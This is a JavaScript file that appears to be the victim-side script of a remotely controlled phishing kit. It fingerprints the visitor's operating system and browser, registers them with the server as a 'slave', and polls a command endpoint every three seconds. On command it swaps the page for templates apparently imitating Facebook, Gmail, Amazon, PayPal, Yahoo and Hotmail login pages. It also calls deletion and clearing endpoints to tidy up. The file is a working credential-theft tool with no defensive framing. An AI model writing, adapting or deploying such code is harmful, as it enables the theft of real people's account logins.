$(window).on("unload", function (e) {
    url = "delete.php";
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    alert("exit");
});

function detectos() {

    var OSName = "Unknown OS";
    if (navigator.userAgent.indexOf("Win") != -1) OSName = "Windows";
    if (navigator.userAgent.indexOf("Mac") != -1) OSName = "Macintosh";
    if (navigator.userAgent.indexOf("Linux") != -1) OSName = "Linux";
    if (navigator.userAgent.indexOf("Android") != -1) OSName = "Android";
    if (navigator.userAgent.indexOf("like Mac") != -1) OSName = "iOS";
    //console.log('Your OS: ' + OSName);
    return OSName;

}

function detectB() {

    var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

    var isFirefox = typeof InstallTrigger !== 'undefined';

    var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) {
        return p.toString() === "[object SafariRemoteNotification]";
    })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));

    var isIE = /*@cc_on!@*/ false || !!document.documentMode;

    var isEdge = !isIE && !!window.StyleMedia;

    //var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);

    if (isFirefox) {
        var brw = "Firefox";
    }
    if (navigator.userAgent.indexOf("Chrome") != -1) {
        var brw = "Chrome";
    }
    if (isSafari) {
        var brw = "Safari";
    }
    if (isOpera) {
        var brw = "Opera";
    }
    if (isIE) {
        var brw = "IE";
    }
    if (isEdge) {
        var brw = "Edge";
    }

    return brw;

}

function adddata(){
    
}

function senddata() {
    var os = detectos();
    var Browser = detectB();
    var browserV = navigator.userAgent;
    var url = "newslave.php";
    //
    var data = "?OS=" + os + "&Browser=" + Browser + "&BrowserV=" + browserV;
    //var params = data;
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url + data, false);
    xmlHttp.send(null);
}
senddata();

function recover(url) {
    var req = new XMLHttpRequest();
    req.open('GET', "clear.php", false);
    req.send(null);
    if (req.status == 200) {
        console.log("clear run!!!");
    }
}

function getdata(url) {
    var req = new XMLHttpRequest();
    req.open('GET', url, false);
    req.send(null);
    if (req.status == 200) {
        var con = (req.responseText);
        document.body.innerHTML = con;
    }
    recover();
}


function recivecommand() {
    var req = new XMLHttpRequest();
    req.open('GET', 'command.php', false);
    req.send(null);
    if (req.status == 200) {
        var con = (req.responseText);
        switch (con) {
            case "FB":
                getdata("./templete/FB.html");
                con = null;
                console.log(con);
                break;
            case "GM":
                getdata("./templete/GM.html");
                con = null;
                console.log(con);
                break;
            case "AZ":
                getdata("./templete/AZ.html");
                con = null;
                console.log(con);
                break;
            case "PL":
                getdata("./templete/PL.html");
                con = null;
                console.log(con);
                break;
            case "YH":
                getdata("./templete/YH.html");
                con = null;
                console.log(con);
                break;
            case "HO":
                getdata("./templete/HO.html");
                con = null;
                console.log(con);
                break;
            case "CS":
                getdata("./templete/FB.html");
                con = null;
                console.log(con);
                break;
            default:
                console.log(con);
        }
    }
}

$(document).ready(function () {
    setInterval(function () {
        recivecommand();
    }, 3000);
});
